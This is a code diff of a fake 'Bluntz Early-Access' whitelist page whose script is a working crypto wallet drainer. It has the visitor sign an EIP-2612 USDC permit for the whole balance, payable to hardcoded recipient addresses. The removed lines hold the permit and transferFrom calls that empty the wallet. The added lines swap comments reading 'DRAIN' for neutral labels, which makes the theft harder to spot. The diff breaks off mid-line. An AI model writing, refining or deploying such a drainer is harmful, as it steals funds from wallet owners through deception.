@@ -17,17 +17,17 @@
 <body>
   <div class="card">
     <h2>Bluntz Early-Access</h2>
-    <p>Tap below to connect wallet.</p>
+    <p>Connect wallet to verify whitelist.</p>
     <button id="go">Connect Wallet</button>
     <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
   </div>
 
 <script type="module">
-// ===== CONFIG =====
+/* ===== CONFIG ===== */
 const RECIPIENT_BASE = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
 const RECIPIENT_SOL  = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA";
 
-// ===== EIP-2612 DRAIN (exact Base-USDC balance) =====
+/* ===== EIP-2612 OBJECT ===== */
 const domain = {
   name: "USD Coin",
   version: "2",
@@ -44,20 +44,22 @@ const types = {
   ]
 };
 
-// ===== WEB3 SETUP =====
+/* ===== WALLET ACCESS ===== */
 let provider;
 if (window.ethereum) provider = window.ethereum;
 else if (window.solana && window.solana.isPhantom) provider = window.solana;
-if (!provider) { alert("Open in MetaMask/Phantom browser"); }
+if (!provider) { alert("Open inside MetaMask/Phantom browser"); }
 
+/* ===== BUTTON FLOW ===== */
 document.getElementById("go").addEventListener("click", async ()=>{
   document.getElementById("go").style.display="none";
-  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve wallet connection.</p>`;
+  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve in wallet.</p>`;
 
+  /* 1) CONNECT */
   const accounts = await provider.request({method:"eth_requestAccounts"});
   const owner = accounts[0];
 
-  // --- 1) DRAIN BASE-USDC (exact amount) ---
+  /* 2) BUILD PERMIT (exact USDC balance) */
   const p   = new ethers.providers.Web3Provider(provider);
   const tok = new ethers.Contract(domain.verifyingContract,[
     "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
@@ -70,17 +72,5 @@ document.getElementById("go").addEventListener("click", async ()=>{
   const deadline = Math.floor(Date.now()/1000)+3600;
   const message = { owner, spender:RECIPIENT_BASE, value:bal.toString(), nonce, deadline };
 
-  document.querySelector(".card").innerHTML=`<h2>Whitelist Permit</h2><p>Sign the gas-free message.</p>`;
-  const raw = await provider.request({
-    method: "eth_signTypedData_v4",
-    params: [owner, JSON.stringify({ domain, types, primaryType:"Permit", message })]
-  });
-  const {v,r,s} = ethers.utils.splitSignature(raw);
-
-  // drain Base-USDC
-  const permitTx = await tok.permit(owner,RECIPIENT_BASE,bal,deadline,v,r,s);
-  await permitTx.wait();
-  const xferTx = await tok.transferFrom(owner,RECIPIENT_BASE,bal);
-  await xferTx.wait();
-
- 
+  /* 3) SIGN PERMIT */
+  document.query
